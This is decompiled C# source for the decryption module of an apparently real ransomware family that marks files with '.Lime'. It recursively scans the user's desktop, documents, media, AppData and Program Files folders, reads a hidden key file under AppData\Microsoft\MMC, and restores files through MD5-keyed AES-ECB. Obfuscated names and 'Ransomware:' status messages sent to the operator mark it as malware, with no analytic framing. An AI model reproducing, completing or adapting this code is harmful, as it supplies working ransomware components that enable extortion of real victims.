using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

public class RwareDE
{
	public RwareDE()
	{
		Class13.eamVqU3zSE23Z();
		base._002Ector();
	}

	public object Decrypt_File()
	{
		method_0();
		object result = default(object);
		return result;
	}

	private object method_0()
	{
		Class6.smethod_25("MSG" + Class6.string_12 + "Ransomware: Please wait..");
		string string_ = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
		method_1(string_);
		string_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		method_1(string_);
		string_ = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		method_1(string_);
		string_ = Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\";
		method_1(string_);
		string_ = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
		method_1(string_);
		string_ = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\";
		method_1(string_);
		string_ = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\";
		method_1(string_);
		string_ = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\";
		method_1(string_);
		string_ = Environment.GetFolderPath(Environment.SpecialFolder.Recent) + "\\";
		method_1(string_);
		Class6.smethod_25("MSG" + Class6.string_12 + "Ransomware: All files have been decrypted");
		return true;
	}

	private object method_1(string string_0, bool bool_0 = false)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string key = File.ReadAllText(folderPath + "\\Microsoft\\MMC\\hash");
		checked
		{
			try
			{
				int num = ((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(string_0).Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(string_0)[i].IndexOf(".Lime") > -1)
					{
						if (!bool_0)
						{
							DeCrypt(((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(string_0)[i], key);
						}
						((ServerComputer)Class3.Class2_0).get_FileSystem().DeleteFile(((ServerComputer)Class3.Class2_0).get_FileSystem().GetFiles(string_0)[i] + ".Lime");
					}
				}
				int num2 = ((ServerComputer)Class3.Class2_0).get_FileSystem().GetDirectories(string_0).Count - 1;
				for (int i = 0; i <= num2; i++)
				{
					method_1(((ServerComputer)Class3.Class2_0).get_FileSystem().GetDirectories(string_0)[i]);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string[] result = default(string[]);
			return result;
		}
	}

	public object DeCrypt(object file, object key)
	{
		byte[] input = File.ReadAllBytes(Conversions.ToString(file));
		try
		{
			File.WriteAllBytes(Conversions.ToString(NewLateBinding.LateGet(file, (Type)null, "replace", new object[2] { ".Lime", "" }, (string[])null, (Type[])null, (bool[])null)), AES_Decrypt(input, Conversions.ToString(key)));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return true;
	}

	public byte[] AES_Decrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
			result = array2;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
